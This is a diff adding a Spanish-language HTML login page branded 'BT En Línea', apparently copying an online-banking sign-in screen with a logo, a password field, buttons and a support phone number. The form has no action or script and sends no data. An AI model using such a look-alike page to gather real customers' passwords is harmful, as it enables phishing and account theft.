@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BT En Línea</title>
+    <style>
+        :root {
+            --move-position: 500px; /* Mover el contenido horizontalmente (solo para pantallas grandes) */
+        }
+
+        body {
+            margin: 30;
+            font-family: Arial, sans-serif;
+            background: url('fondo.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            overflow-x: hidden;
+            transform: translateX(var(--move-position)); /* Mueve el contenido solo en pantallas grandes */
+        }
+
+        .movable-content {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .logo {
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 90%; /* Ajustar el logo a pantallas más pequeñas */
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: bold;
+            color: #0F172A;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 12px;
+            font-weight: normal;
+        }
+
+        .form-group-single input {
+            width: 100%;
+            padding: 9px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 9px;
+            box-sizing: border-box;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+        }
+
+        .btn-secondary {
+            flex: 1;
+            background-color: #EF3641;
+            color: white;
+            font-size: 14px;
+            padding: 10px;
+            text-align: center;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .btn-secondary:hover {
+            background-color: #D4303B;
+        }
+
+        .btn-primary {
+            flex: 1;
+            background-color: #1511A0;
+            color: white;
+            font-size: 14px;
+            padding: 10px;
+            text-align: center;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .footer a {
+            color: #1a58b7;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        /* Media Queries para pantallas pequeñas */
+        @media (max-width: 768px) {
+            body {
+                background: url('btenlinea_movil.jpg') no-repeat center center fixed; /* Fondo diferente para móviles */
+                background-size: cover;
+                transform: translateX(0); /* Quitar desplazamiento en móviles */
+                justify-content: center;
+                align-items: center;
+            }
+
+            .movable-content {
+                padding: 15px;
+            }
+
+            .logo img {
+                width: 100%;  /* Hacer que el logo ocupe el 100% del ancho disponible */
+                height: auto;  /* Mantener la proporción del logo */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="movable-content">
+        <div class="logo">
+            <img src="logo-slogan.png" alt="BT En Línea">
+        </div>
+        <h1>Ingreso a BT En Línea</h1>
+        <form>
+            <div class="form-group">
+                <label for="password">Ingresa tu contraseña</label>
+                <div class="form-group-single">
+                    <input id="password" type="password" placeholder="Escribe tu respuesta">
+                </div>
+            </div>
+            <div class="btn-container">
+                <button type="button" class="btn-secondary">Cancelar</button>
+                <button type="submit" class="btn-primary">Ingresar</button>
+            </div>
+        </form>
+        <div class="footer">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <p>Para mayor información o asesoría contáctanos al Centro de Atención Telefónica 0500-2837676</p>
+        </div>
+    </div>
+</body>
+</html>
